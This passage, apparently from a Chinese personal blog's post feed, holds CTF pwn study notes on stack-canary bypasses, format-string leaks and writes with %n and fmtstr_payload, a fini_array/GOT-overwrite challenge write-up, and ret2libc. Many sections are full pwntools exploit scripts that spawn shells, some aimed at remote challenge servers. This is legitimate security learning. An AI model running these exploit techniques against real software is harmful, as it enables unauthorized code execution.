12345payload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary)) 用b替代canary最低位的\\x00,使得它的值可以被输出 然后用收到的数据减去b的值就是canary的值 1payload+=p32(0)*2 两个padding 分配了 0x118字节的栈空间给局部变量和padding。 栈空间一次性分配，便于管理和性能 编译器在函数入口会执行类似 sub esp, 0x118 的操作，一次性给函数所有局部变量、临时数据和对齐空间分配足够大的连续栈空间。分配的 280 字节是 buf + 其他局部变量 + padding 这块空间里包含你所有局部变量（比如 buf）、隐式变量（比如保存的寄存器）、以及为了满足 CPU 访问对齐需求而插入的 padding。 从ebp开辟了0x118个字节存放，但buf从ebp-0x10c开始存储，接着是canary，所以还有两个padding canary不一定是挨着缓冲区的，单在这道题是的 情况 会插 canary 紧挨数组吗？ 函数里有 char buf[xxx] ✅ 一般会放 canary 在 buf 后面 没有数组、不会栈溢出 ❌ 通常不会启用 canary 数组不在栈上（比如 malloc 的） ❌ 不是栈保护的范围 特殊优化或内联小函数 ⚠️ 可能被省略 虽然 canary 的位置不是硬编码的，但在实际场景中（特别是题目明确有 char buf[] 并开启了 canary），它通常 就在 buf 后面，且通过调试或试探可以准确确定它的偏移位置。 脚本2（格式化字符串）可以看到buf在第7个位置上 而且buf有256个字节，可以存放64个字符 所以canary就是在第64+7即71个参数的位置 123456789101112131415161718from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b printf&quot;)target = 0x080485CCp1 = &quot;%71$p\\n&quot;p.send(p1)leak_info = p.recvuntil(&quot;\\n&quot;,drop = True)canary = int(leak_info,16)log.success(&quot;canary:&quot; + hex(canary))p2 = b&quot;\\x00&quot; * 0x100 + p32(canary)p2 += p32(0) * 3p2 += p32(target)p.send(p2)p.interactive() 2.one_by_one_bruteforce(逐个字节爆破)通过fork函数开启子进程交互的题目，因为fork函数会直接拷贝父进程的内存，所以每次创建的子进程的Canary是相同的。我们可以利用这个特点，逐个字节地将Canary爆破出来。 脚本123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *p = process(&quot;./one_by_one_bruteforce&quot;)def bruteforece1bit(): global known for i in range(256): p1 = &quot;a&quot; * 0x108 p1 += known p1 += chr(i) p.sendafter(&quot;one_by_one_bruteforce\\n&quot;,p1) try: info = p.recvuntil(&quot;\\n&quot;) if &quot;*** stack smashing detected ***:&quot; in info: p.send(&quot;n\\n&quot;) continue else: known += chr(i) break except: log.info(&quot;maybe there something wrong&quot;) breakdef bruteforce_canary(): global known known += &quot;\\x00&quot; for i in range(7): bruteforece1bit() if i != 6: p.send(&quot;n\\n&quot;) else: p.send(&quot;y\\n&quot;)context.log_level = &quot;debug&quot;target = 0x000000000040083Eknown = &quot;&quot;bruteforce_canary()canary = u64(known)log.success(&quot;canary:&quot; + hex(canary))p2 = &quot;a&quot; * 0x108 + p64(canary) + p64(0) + p64(target)p.sendafter(&quot;go\\n&quot;,p2)p.interactive() 逐字节尝试，无“stack smashing detected”报错回显来对Canary的数值进行逐字节爆破。如果输入正确，则没有回显，能得到Canary的这个字节，然后开始下一个字节的爆破；如果输入有误，则爆破不成功，继续下一个爆破的数值，爆破不成功时子进程会报错退出，但不会影响父进程，父进程会一直创建子进程，可以利用这一点实现爆破。得到Canary的具体数值后，可以在父进程进行栈溢出，覆盖返回地址，实现Getshell，也可以在子进程中实现Getshell。因为有了Canary的具体数值，所以可以绕过Canary保护机制 3.stack_smashesstack_smashes是一种特殊的利用思路。前面已经提到过，在_stack_chk_fail函数中会将_libc_argv[0]的信息打印出来， 例如(stack smashing detected : [程序名] terminated）如果能够控制__libc_argv[0]中保存的地址为我们想要的信息的地址，那么就能得到相应的数据。 在 Linux 系统中，程序名通常是通过读取 __libc_argv[0] 这个全局指针来实现的。__libc_argv 是 libc 库内部维护的一个指针数组，其中 __libc_argv[0] 指向当前进程的可执行文件路径字符串。 攻击者通过任意地址写入（通常通过 ROP 链实现）将 __libc_argv[0] 这个指针的值，从原来的程序名地址，修改为我们想要泄露的数据的地址（例如 flag 的地址）。 🔍 main 函数的标准原型 1int main(int argc, char *argv[], char *envp[]); argc: 命令行参数个数 argv: 参数字符串数组指针 envp: 环境变量字符串数组指针 在栈上，这些参数是由 __libc_start_main 调用 main 时传入的。 所以查看buf的地址 直接下断点到read的位置，看到buf的位置是0x7fffffffdc00 接着查看libc_argc[1],即文件信息 0x7fffffffde18 计算好偏移之后就可以把libc_argc[0]的地址换为flag的地址了 脚本12345678910from pwn import *p = process(&quot;./stack_smashes&quot;)#gdb.attach(p,&quot;b *0x0000000000400875&quot;)context.log_level = &quot;debug&quot;flag_addr = 0x0601090p2 = &quot;a&quot; * 0x218 + p64(flag_addr)p.sendafter(&quot;stack_smashes\\n&quot;,p2)p.interactive() 还有就是直接把stack_chk_fail函数的get表村的地址改为后门函数的地址 偏移是6 脚本12345678910111213from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,word_size=&#x27;64&#x27;)p=remote(&quot;node5.buuoj.cn&quot;,25904)#p = process(&quot;./r2t4&quot;)elf = ELF(&quot;./r2t4&quot;)backdoor = 0x400626#__stack_chk_fail_got_addr = elf.got[&quot;__stack_chk_fail&quot;]__stack_chk_fail = elf.got[&#x27;__stack_chk_fail&#x27;]payload = fmtstr_payload(6, &#123;__stack_chk_fail: backdoor&#125;).ljust(0x38,b&#x27;a&#x27;)p.sendline(payload)p.interactive() 总结来说，ljust(0x38, b’a’) 的目的是： 确保 read 函数读取到完整的、由我们控制的 56 字节数据。 防止 read 函数读取到其他不可预测的数据，从而干扰 printf 的行为。","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"ciscn_2019_sw_1","slug":"ciscn-2019-sw-1","date":"2025-07-22T11:58:20.000Z","updated":"2025-09-03T10:55:55.833Z","comments":true,"path":"2025/07/22/ciscn-2019-sw-1/","permalink":"http://example.com/2025/07/22/ciscn-2019-sw-1/","excerpt":"","text":"存在system函数，不需要泄露libc的地址 直接把printf的got表地址覆盖为system函数的地址，然后传递参数为“&#x2F;bin&#x2F;sh”即可 而且偏移是4 但是该格式化字符串漏洞只被执行了一次，无法实现操作 所以要修改收尾函数的地址以实现对格式化字符串漏洞的多次调用 用readelf去找fini_array的地址 脚本 1234567891011121314151617181920212223242526272829from pwn import *from LibcSearcher import LibcSearcher#p=process(&quot;./ciscn_2019_sw_1&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29318)elf=ELF(&quot;./ciscn_2019_sw_1&quot;)fini=0x0804979cprintf=elf.got[&quot;printf&quot;]main=0x08048534sys=0x080483D0sys_h=(sys&gt;&gt;16)&amp;0xffffsys_l=sys&amp;0xffffmain_h=(main&gt;&gt;16)&amp;0xffffmain_l=main&amp;0xffffpayload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;#%c的意思是打印n个字符payload+=b&quot;%5$hn&quot;payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;payload += b&#x27;\\x00&#x27;p.sendlineafter(b&quot;name?\\n&quot;,payload)payload=b&quot;/bin/sh&quot;p.sendlineafter(b&quot;name?\\n&quot;,payload)p.interactive() 注意 四个写入的数是递增的 如何取高 16 位 地址右移 16 位：system_plt &gt;&gt; 16 把高 16 位“移到”最低位 对于 0x080483d0： 10x080483d0 &gt;&gt; 16 = 0x0804 为什么还要 &amp; 0xffff？ 因为高 16 位虽然已经移到低位了，但 Python 整数没有“溢出”概念。 为了确保最终结果只保留低 16 位（即最大不超过 0xffff），就用掩码 0xffff 取最低 16 位。 1b&#x27;%&#x27; + bytes(str(xxx), &quot;utf-8&quot;) + b&#x27;c%4$hn&#x27; 这里的含义是： 这串字符串拼接后是啥样？举个例子，假设 xxx &#x3D; 100，拼接结果是： 1b&#x27;%100c%4$hn&#x27; 这在格式化字符串里的意思%100c ：向输出缓冲区写入 100个空格字符，使得“已经输出字符数”加100。 %4$hn ：把当前的输出字符数（现在应该是前面已有字符数 + 100）写入 第4个参数指向的地址，写入2字节。 为什么不用 %n 直接写 4 字节？（两个字节用hn,四字节用n） 理论上可以直接用 %n 一次写完整 4 字节（一个 int），但是： 1️⃣ 数字范围的问题 如果你想写的数是： 12复制编辑0x08048534 那就是：134513204（十进制），而格式化字符串里的输出字符数必须刚好是这个数才能写出来。 你需要输出 134,513,204 个字符才能让 %n 写出这个数……显然不现实，程序很可能崩溃或超时。 fini.array原理🛡️ 1️⃣ RELRO 与各段的可写性 ELF 程序里有这几个关键的表&#x2F;段： 段&#x2F;表 正常作用 为什么能写 RELRO保护后的变化 .got.plt 存储动态链接函数的真实地址（lazy binding后） lazy binding 需要写入真实地址 NO RELRO 时可写，PARTIAL RELRO 也可写，FULL RELRO 时不可写 .init_array 程序启动时调用的函数数组 存函数指针 NO RELRO 时可写，PARTIAL&#x2F;FULL 时不可写 .fini_array 程序退出时调用的函数数组 存函数指针 NO RELRO 时可写，PARTIAL&#x2F;FULL 时不可写 ✨✅ .fini_array 存的是退出时要调用的函数指针。✅ 利用时先把 .fini_array=main，退出时重启 main，给你多一次利用机会。✅ 通常 .fini_array 只有一个指针的位置，只能写一个。 🔁 为什么 .fini_array 能帮忙 因为： 1️⃣ 程序退出时，libc 会主动去遍历 .fini_array，执行里面的函数指针。 2️⃣ 默认 .fini_array[0] 指向某个收尾函数。 3️⃣ 如果你把 .fini_array[0] 改成 main 的地址，那程序在退出时就会再一次调用 main，相当于重启了程序。 收尾函数、是程序退出（或结束）前，操作系统或运行时环境会调用这些函数来做善后工作。 流程大致是： 1main 函数执行 → main 返回 → 运行时开始调用“收尾函数” → 资源释放完毕 → 程序完全退出 sendlineafter() vs sendafter() 的区别 函数 行为 是否自动加 \\n 适用场景 sendlineafter() 等待特定字符串出现后发送数据，自动在末尾加 \\n（换行符） ✅ 是 适用于需要换行符的交互（如 scanf、gets、fgets） sendafter() 等待特定字符串出现后发送数据，不自动加 \\n ❌ 否 适用于不需要换行符的交互（如 read、recv） 在这里我们是用scanf读取数据，它在读取到&#x2F;n时才会停止，所以要用sendlineafter()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"fini_array","slug":"fini-array","permalink":"http://example.com/tags/fini-array/"},{"name":"分字节","slug":"分字节","permalink":"http://example.com/tags/%E5%88%86%E5%AD%97%E8%8A%82/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"格式化字符串","slug":"格式化字符串","date":"2025-07-21T01:05:48.000Z","updated":"2025-08-30T11:58:48.243Z","comments":true,"path":"2025/07/21/格式化字符串/","permalink":"http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。 通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。 一般来说，格式化字符串在利用的时候主要分为三个部分： (1）格式化字符串函数。 (2）格式化字符串。 (3）后续参数，可选。 用printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalary） printf函数叫作格式化字符串函数，”name:%s,age:%d,salary:%4.2f”叫作格式化字符串，“myname,myage,mysalary”叫作后续参数。 🧱 常见的格式化字符串符号 格式符 作用 示例 %x&#x2F;%p 以十六进制形式输出栈上的值 %x→0xdeadbeef %p通常带0x前缀 %d&#x2F;%u 以十进制输出栈上的值 %d→3735928559 %c 输出栈上值的最低一个字节 %c→&#39;A&#39; %s 把栈上的值当作地址，输出该地址的字符串 %s→&quot;Hello&quot; %hn 写入 2 字节（short） %hn→ 写入低 2 字节 %hhn 写入 1 字节（char） %hhn→ 写入低 1 字节 %n 将已输出字符数写入栈上的地址 %n→ 写入0x4到指定地址 %$p&#x2F;%%$s 指定第几个参数位置的值 %4$p→ 第 4 个参数 %% 输出一个%字符本身 %%→% 当用户控制了 printf() 的第一个参数（即格式化字符串），而程序没有进行过滤或限制，就可能造成以下问题： 123char input[100];fgets(input, sizeof(input), stdin);printf(input); // ⚠️ 危险！用户输入直接作为格式化字符串 此时，攻击者可以构造输入，如： %x %x %x %x %s 程序会尝试从栈中读取参数，但由于没有提供参数列表，printf() 会继续从栈中“猜测”数据。这可能导致： 泄露栈内存内容（如返回地址、canary、函数指针等） 写入内存（通过 %n 格式符） 虽然没有写任何参数，但还是会对应地解析参数，因为在格式化字符串中写了对应的解析方式，所以在后续的函数运行中会解析栈上的元 素。对于整型值和浮点值，这没有什么问题，不管栈上是什么数据都能够按照整型值和浮点值解析出来，而字符串形式就不一定能解析出来 了。如果是一个非法地址，比如NULL，那么在解析的时候就会报错， 因为这个地址按照字符串解析是无法解析出来的，程序就会崩溃。这就是格式化字符串漏洞的基本原理 利用leakmemory(泄露栈上内容) 用了 %100s 来防止缓冲区溢出，但并没有限制用户输入的格式符内容 。也就是说： 用户可以输入 %x、%s、%n 等格式符。 printf 会根据这些格式符从栈中“猜测”数据，从而造成信息泄露或任意地址写入。 leakmemory(泄露任意地址内存)这里的目标设立泄露isoc99_scanf函数（scanf编译之后是isoc99_scanf在内存中的地址）。 %k$s 这里的p是可以更换的，比如更换为s就可以解析栈上的数据为字符串。 k：表示要打印的参数距离目前格式化字符串参数的距离。 因为在没有给printf提供对应的字符，但它是一个可变参数函数 ，它会从栈上依次读取数据来填充格式化字符串中的 %p、%x、%s、%n 等指令。 但你并不知道你输入的字符串在栈上的具体位置，所以你需要： 找到你的输入字符串在栈上的偏移量，才能精准控制读写的内容。 所以偏移量就是4 所以构造payload &#x3D; p32(scanf_got) + “%4$s” 相当于print(p32(scanf_got) + “%4$s”) 所以前四个字节是输出的scanf的got表 🧠 关键区别：地址 vs 地址的内容 scanf_got GOT 表中scanf的地址（.got段中的一个位置） 0x804a008 就像书的目录页码 泄露的地址（leak_addr） 这个 GOT 表项中存储的值（即scanf的实际地址） 0xf7e01234 就像目录页码指向的那一页的内容 脚本1234567891011121314from pwn import *p = process(&quot;./leakmemory&quot;)elf = ELF(&quot;./leakmemory&quot;)#gdb.attach(p,&quot;b printf&quot;)scanf_got = elf.got[&quot;__isoc99_scanf&quot;]payload=p32(scanf_got)+b&quot;%4$s&quot;p.sendline(payload)leak_addr = u32(p.recv(8)[4:])scanf_addr = leak_addrlog.success(&quot;scanf_addr:&quot; + hex(scanf_addr))p.interactive() printf 执行流程： printf 会从栈上读取参数； 它看到 %4$s，会从第 4 个参数位置读取一个地址； 这个地址是 0x804a018（你写入的 GOT 地址）； 然后从 0x804a018 地址中读出一个指针（比如 0xf7e01234，即 scanf 的运行时地址）； %s 会从 0xf7e01234 开始读取字符串，直到遇到 \\0； 最终你接收到的数据中包含 0xf7e01234。 📌 总结 elf.got[&quot;scanf&quot;]和elf.got[&quot;__isoc99_scanf&quot;]一样吗？ 不一定，取决于编译器 为什么会有__isoc99_scanf？ GCC 编译器为了支持 C99 标准引入的 怎么确认用哪个？ 用readelf -r或objdump -TR查看 GOT 表 能不能替换？ 只有 GOT 表中存在对应符号时才能替换 如果写错了会怎样？ 报错：KeyError 函数调用完整过程🌟 阶段 0️⃣：在 vulnfunc 里（调用 printf 之前） 这是已经在 vulnfunc 里，且栈帧已经建立好了。 栈顶在 esp，栈低在高地址方向。 12345678910111213 ↑ 高地址──────────────────────────────| 参数n（可能是命令行参数） || 参数2 || 参数1 |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc 的 ebp)──────────────────────────────| vulnfunc 局部变量 || … | ← esp （在 vulnfunc 里） ↓ 低地址 当你刚进入 vulnfunc： ebp → 上一个 ebp ebp+4 → 返回地址（返回到 main） ebp-xx → vulnfunc 的局部变量 esp → 最低处，指向局部变量 🌟 阶段 1️⃣：调用 printf(format) 当 vulnfunc 调用： 12printf(format); 调用者把返回地址 &amp; 参数压入栈： 1234567891011121314 ↑ 高地址──────────────────────────────| 参数n（main 的参数） || … |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量 |──────────────────────────────| 参数1=format | ← esp+4| 返回地址 → vulnfunc+下一条 | ← esp ↓ 此时 esp 指向 printf 的返回地址，再往上是 printf 的参数。 🌟 阶段 2️⃣：进入 printf 后 在 printf 开始执行后，它建立自己的栈帧： 1234567891011121314151617 ↑ 高地址──────────────────────────────| 参数n（main 的参数） || … |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量 |──────────────────────────────| 参数1=format | ← ebp+8| 返回地址 → vulnfunc+下一条 | ← ebp+4| 上一个 ebp | ← ebp (printf)──────────────────────────────| printf 局部变量 | ← esp ↓ 这里： printf 把当前的 ebp 压栈 把 ebp 设置为 esp esp 再向下留出局部变量空间 scanf函数会把读取到的数放在栈上一个空间，然后%p会把它泄露出来 使用 scanf 读取一个字符串（最多 100 字节），存入 format 缓冲区； 然后直接将这个字符串作为参数传给 printf，即：printf(format); overwrite(覆盖任意地址内存) 所以这道题的重点是修改几个数的值 1）将a覆盖为0x10。 2）将b覆盖为2。 3）将c覆盖为0x12345678。 其中a是局部变量，b,c是全局变量 局部变量存储在栈上，全局变量存储在数据段中（分为已初始化rodata和未初始化bss两部分） 12345678910111213141516171819202122232425262728+---------------------+ &lt;--- 高内存地址| 命令行参数 &amp; 环境变量 |+---------------------+| 栈 (Stack) | &lt;-- 局部变量、函数参数、返回地址| || Function Call N || (局部变量, 返回地址等)|| Function Call 2 || (局部变量, 返回地址等)|| Function Call 1 || (局部变量, 返回地址等)|| ... || || 空闲 || |+---------------------+| 堆 (Heap) | &lt;-- 动态分配内存 (malloc/new)| || ... |+---------------------+| .bss 段 (未初始化数据) | &lt;-- 未初始化的全局变量和静态变量 (例如: b)+---------------------+| .data 段 (已初始化数据) | &lt;-- 已初始化的全局变量和静态变量 (例如: c)+---------------------+| .text 段 (代码) | &lt;-- 程序执行代码 (指令)+---------------------+| 保留区域 |+---------------------+ &lt;--- 低内存地址 a的处理（局部变量）首先，a是局部变量，局部变量是存储在栈上的，其地址会因为开启ASLR而变化，所以在函数中将a的地址打印出来了 脚本12345678from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&#x27;\\n&#x27;,drop=True),16)print(hex(a))payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;p.sendline(payload)m=p.recv()print(m) int和u32() 函数 int(..., 16) 接收到的是字符串形式的地址（如&quot;0xffa79dbc&quot;） 转换为整数地址 主动泄露地址 u32(...) 接收到的是原始 4 字节数据（如b&#39;\\xbc\\x9d\\xa7\\xff&#39;） 将小端序的 4 字节转为整数 调用泄露地址 🧩 p32(a_addr) 是怎么用的？ 构造的 p32(a_addr) 会被 printf 当作一个参数处理： 它被压入栈上； %8$n 会从第 8 个参数位置读取它； 这个地址就是写入的目标地址。 🧩 %12c 是怎么用的？（目标是16，a的地址占四个字节） %12c 输出 12 个字符（如空格）； %n 会把当前输出的字符总数写入指定地址； 所以 %12c 的作用是让 %n 写入 12； 它本身不写入内存，但会影响 %n 的值。 不能换成b’a’*12,这个不会影响%n的总数 工作原理： 当 printf(payload) 执行时，payload 字符串会被放到栈上。 printf 开始解析 payload。它会把 p32(a_addr) 视为一个普通的字符串（但它实际上是 v1 的地址）。 然后遇到 %12c，它输出 12 个字符。 接着遇到 %8$n。此时 printf 已经输出了 12 个字符。它会去栈上寻找第 8 个参数的地址。由于 p32(a_addr) 放在了 payload 的开头，并且其长度是 4 字节，它会正好落在栈上第 8 个参数的位置上（这个偏移量是经过调试确定的）。 printf 会将当前已输出的字符数 12 写入到 p32(a_addr) 所表示的地址，也就是局部变量 v1 的地址。 最终，v1 的值被修改为 12。 b的处理（全局小数） b,c的地址可以直接找到 脚本1234567891011121314from pwn import *p = process(&quot;./overwrite&quot;)elf = ELF(&quot;./overwrite&quot;)#gdb.attach(p,&quot;b printf&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))b=0x0804A028payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)p.sendline(payload)info=p.recvline()if b&quot;overwrite b for a small value&quot; in info: print(b&quot;Success\\n&quot;)p.interactive() 为什么不能按照覆盖 a 的方法？（因为%n，b的地址已经超过2了，所以b的地址只能在%_$n之后） 偏移量计算的差异： 在覆盖 a 的方法中，p32(a_addr) 放在了 payload 的最开头，并且 printf 发现这个开头在它的参数列表中是第 8 个。 但是，如果将 p32(b_addr) 也放在 payload 的开头并尝试用 %8$n 写入，可能会遇到问题： 地址值与格式符冲突：0x0804A028 这个地址本身如果被 printf 解析成格式化字符串的一部分，可能会包含 % 或其他特殊字符，导致 printf 崩溃或行为异常。例如，地址的某个字节可能被解释为 %s 或 %x 的一部分，导致 printf 试图读取无效的内存地址。 控制性问题：我们通常希望将要写入的地址放在格式字符串的末尾，这样它就不会被 printf 误认为是格式符的一部分来处理，而只是一个普通的 4 字节数据。 特性 覆盖 v1 (局部变量) 覆盖 b (全局变量) 目标类型 栈上的局部变量 数据段上的全局变量 地址来源 运行时泄露 (每次可能不同) 静态固定 (编译时确定) p32(addr) 位置 放在 payload 的开头 放在 payload 的末尾 %n 偏移 8$ (因为地址放在开头，且在第 8 个参数位置) 10$ (因为地址放在末尾，且在第 10 个参数位置) 主要考量 确保 p32(addr) 不被误解为格式符，且在正确偏移 避免 b_addr 字节被误解为格式符，更稳定地作为参数地址 好的，如果你确认这个 b 是必须的，那么它在 payload 中的存在，就意味着它在栈的布局和 printf 对参数的解析中起到了关键作用，通常是保证了 p32(b_addr) 的正确对齐，使其落在 %10$n 预期的参数位置。 让我们来详细分析，为什么多一个 b 反而可能成为“必须的”。 有 b 的详细分析 1payload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr) 让我们计算每个部分的长度： b&quot;aa&quot;：2 字节 b&quot;%10$n&quot;：5 字节 b&quot;b&quot;：1 字节 p32(b_addr)：4 字节 (假设 b_addr 是 0x0804A028) 总字节数 &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 字节,在这里，b是为了补足字节 c的处理（全局大数） 这是一个很大的数，考虑逐字节写入 这里想把c覆盖为0x12345678，而c的地址是0x0804A02C，所以基本目标是： 12340x0804A02C:\\x780x0804A02D:\\x560x0804A02E:\\x340x0804A02F:\\x12 脚本1234567891011121314from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))c=0x0804A02Cpayload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)p.sendline(payload)info =p.recvline()if b&quot;overwrite c for a big value&quot; in info: print(b&quot;Success&quot;)p.interactive() fmtstr_payloadfmtstr_payload 是 pwntools 提供的一个自动化工具 ，用于构造格式化字符串漏洞（Format String Vulnerability）的 payload 。 它的作用是： 自动计算字符数并构造 payload，用于写入任意地址的值（如 GOT 表、变量、返回地址等） 🧪 fmtstr_payload 的使用方法 基本语法 12from pwn import *fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) 参数说明 offset 格式化字符串偏移量（你的输入在第几个%p的位置） writes 一个字典，表示你要写入的地址和值，如&#123;addr1: value1, addr2: value2&#125; numbwritten 已经输出的字符数（默认为 0，可以忽略） write_size 写入大小，可选：&#39;byte&#39;、&#39;short&#39;、&#39;int&#39;（默认是&#39;byte&#39;） 🧩 示例 1：写入一个地址为 16 123456789101112from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8 # 偏移量addr = elf.symbols[&#x27;a&#x27;] # 假设你要写入变量 a 的地址# 构造 payload：写入 a = 16payload = fmtstr_payload(offset, &#123;addr: 16&#125;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() 🧩 示例 2：写入多个地址（如 a=16, b=2, c=0x12345678） 12345678910111213141516171819from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8a_addr = elf.symbols[&#x27;a&#x27;]b_addr = elf.symbols[&#x27;b&#x27;]c_addr = elf.symbols[&#x27;c&#x27;]# 构造 payload：写入多个地址writes = &#123; a_addr: 16, b_addr: 2, c_addr: 0x12345678&#125;payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() fmt_demo（格式化字符串的综合利用） 可以先泄露libc的基址，得到system函数的地址 再根据此把printf的got表存储的地址换为system函数的地址 之后输入参数“&#x2F;bin&#x2F;sh”,就可以实现 脚本12345678910111213141516171819202122from pwn import *from LibcSearcher import LibcSearcherp=process(&quot;./fmt_demo&quot;)elf=ELF(&quot;./fmt_demo&quot;)read_got=elf.got[&quot;read&quot;]payload=p32(read_got)+b&quot;%4$s&quot;p.send(payload.ljust(0x100,b&quot;\\x00&quot;))read=u32(p.recv(8)[4:])print(hex(read))libc=LibcSearcher(&quot;read&quot;,read)libc_base=read-libc.dump(&quot;read&quot;)system=libc_base+libc.dump(&quot;system&quot;)payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)p.sendline(payload.ljust(0x100,b&quot;\\x00&quot;))bin=b&quot;/bin/sh&quot;p.sendline(bin.ljust(0x100,b&quot;\\x00&quot;))p.interactive() 那为什么还要填补 payload 的长度为 0x100 字节？” 我们来从 “payload 被复制到栈上” 这个现象出发，解释为什么我们有意地 将 payload 填充到固定长度（如 0x100 字节），尽管它可能会被复制到栈上。 ✅ 简短回答： 我们填补 payload 到固定长度（如 0x100 字节），是为了让 payload 被完整复制到栈上，从而让偏移固定、布局可控，便于利用格式化字符串漏洞进行地址泄露或写入操作。 📌 payload 的两种“命运”： 1️⃣ payload 短 &lt; 一些参数长度 printf从栈上读取参数 payload 在 buf 中，参数在栈上 2️⃣ payload 长 &gt; 一定长度（如 100 字节） printf把 payload 复制到栈上 payload 本身就在栈上 🧩 为什么要“故意”让 payload 被复制到栈上？ ✅ 优点一：偏移固定，便于调试 payload 被复制到栈上后，它在栈上的位置是固定的。 我们可以精准控制偏移（比如 %4$s 就一定读取 payload 中的地址）。 避免了因 payload 长度不同导致偏移变化的问题。 ✅ 优点二：便于构造写入操作（如 %n） 当我们想用 %n 写某个地址时，需要确保地址在栈上，且偏移固定。 如果 payload 被复制到栈上，我们就可以把地址放在 payload 开头，然后用 %1$n 精准写入。 ✅ 优点三：防止 payload 被截断或偏移漂移 如果 payload 长度不固定，可能导致偏移变化，%s、%n 读写错误地址。 填充到固定长度（如 0x100）可以避免这种漂移。 :grey_question:但我其实不太理解","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"ret2libc-printf","slug":"ret2libc-printf","date":"2025-07-20T06:53:58.000Z","updated":"2025-09-03T10:56:53.695Z","comments":true,"path":"2025/07/20/ret2libc-printf/","permalink":"http://example.com/2025/07/20/ret2libc-printf/","excerpt":"","text":"严格符合printf的格式[HarekazeCTF2019]baby_rop2 而且函数中没有system函数和相应字符串 要泄露libc的地址 通过read读取数据，用printf打印出来 printf 函数的 GOT 地址不能用来泄露 printf 自己的地址？ 是的，这是个鸡生蛋蛋生鸡 的问题： printf@got 保存的是 printf 的真实地址（libc 中的地址）。 但你要调用 printf 才能打印它，而调用 printf 又依赖 GOT 表项的地址。 如果 GOT 表项还没解析（延迟绑定），它指向 PLT stub，不是真实地址。 即使 GOT 表项已解析，你也无法通过 printf(&quot;%s&quot;, printf_got) 正确读取地址。 🧠 总结对比 puts(puts_got) ✅ 可行 puts会尝试打印从puts_got开始的内容，libc 中有字符串，不会崩溃 printf(&quot;%s&quot;, printf_got) ❌ 不可行 printf会尝试从printf_got地址读取字符串，但那是个函数地址，不是字符串 printf(&quot;%p&quot;, printf_got) ✅ 可行（需构造） 可以打印地址，但需要正确设置格式字符串 printf(&quot;%s&quot;, read_got) ✅ 可行（偶尔） read_got指向的地址附近可能有字符串，可以打印出来 puts(printf_got) ✅ 可行（偶尔） 同上，但依赖 libc 中的字符串 要调用printf函数进行泄露，就要根据其特性来传参，printf函数有两个参数，一个格式化字符串，一个可变参数列表 RDI、RSI、RDX、RCX、R8、R9参数按照这个顺序传入寄存器中 有单独的rdi 所以rdi&#x3D;0x400733 但没有单独对rsi的处理 所以rsi_r15&#x3D;0x400731，对r15随便传入一个数就可 第一次payload的构造 12345678910payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read)) 第二次通过计算出libc的基址，加上偏移量就得到了需要的函数的地址，就可与i进行构造了 1payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr) 脚本 